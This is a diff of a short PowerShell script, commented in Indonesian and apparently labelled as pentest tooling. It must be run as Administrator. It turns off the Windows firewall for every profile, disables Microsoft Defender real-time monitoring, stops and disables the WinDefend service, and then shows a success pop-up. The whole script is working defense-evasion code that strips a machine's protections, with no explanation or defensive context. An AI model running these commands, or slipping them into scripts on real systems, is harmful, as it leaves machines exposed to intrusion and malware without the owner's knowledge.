@@ -1,9 +1,19 @@
+# Harus dijalankan sebagai Administrator
+
+# Matikan Firewall dulu
 netsh advfirewall set allprofiles state off
 
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Nonaktifkan Realtime Protection (jika Defender aktif)
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true
+} catch {
+    Write-Output "Set-MpPreference gagal: $_"
+}
 
-sc stop WinDefend
-sc config WinDefend start= disabled
+# Stop dan disable service Windows Defender
+sc.exe stop WinDefend
+sc.exe config WinDefend start= disabled
 
+# Notifikasi berhasil
 Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "Notifikasi Pentest", 'OK', 'Information')
+[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "Pentest", 'OK', 'Information')
